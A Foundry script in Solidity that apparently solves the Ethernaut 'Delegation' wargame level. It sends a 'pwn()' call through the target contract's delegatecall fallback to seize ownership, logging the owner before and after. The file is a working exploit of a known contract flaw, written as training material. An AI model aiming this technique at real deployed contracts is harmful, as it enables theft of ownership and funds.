// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x153eD2D8a8180b6F1781129766990C87ec35F65d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}